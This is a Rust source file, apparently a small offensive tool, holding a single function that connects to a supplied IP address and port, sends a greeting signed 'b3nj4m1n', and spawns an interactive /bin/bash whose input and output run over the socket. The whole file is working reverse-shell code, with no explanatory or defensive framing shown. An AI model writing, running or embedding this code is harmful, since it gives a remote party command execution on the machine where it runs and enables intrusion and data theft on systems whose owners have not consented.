use std::net::{Ipv4Addr, TcpStream};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use std::io::{Write,Read,ErrorKind};
use std::thread;

pub fn shell(ipv4:Ipv4Addr,port:u16){

        let server_address = format!("{}:{}",ipv4.to_string(),port);
 
        match TcpStream::connect(server_address) {
            Ok(mut sock) => {
                println!("Connected to server!");
    
                // Write data to the server
                sock.write_all(b"Hello, I'm b3nj4m1n!!\n").unwrap();
                
                let fd = sock.as_raw_fd();
 
                thread::spawn( move || {
                    let fd2 = fd.clone();
                    Command::new("/bin/bash")
                    .arg("-i")
                    .stdin(unsafe { Stdio::from_raw_fd(fd2) })
                    .stdout(unsafe { Stdio::from_raw_fd(fd2) })
                    .stderr(unsafe { Stdio::from_raw_fd(fd2) })
                    .spawn()
                    .unwrap()
                    .wait()
                    .unwrap();

                });
                thread::spawn(move || {
                    let fd3=fd.clone();
                    println!("Press any key to stop the server...");
                    let _ = std::io::stdin().read(&mut [0u8]).unwrap();
                    unsafe {
                        libc::shutdown(fd3, libc::SHUT_RD);
                    }
                    
                
                }).join().unwrap();
            },
            Err(e) if e.kind() == ErrorKind::ConnectionAborted => {
                println!("Other side disconnected");
            }
            Err(e) => {
                println!("Some other error occurred: {e}");
            }

    }
  
}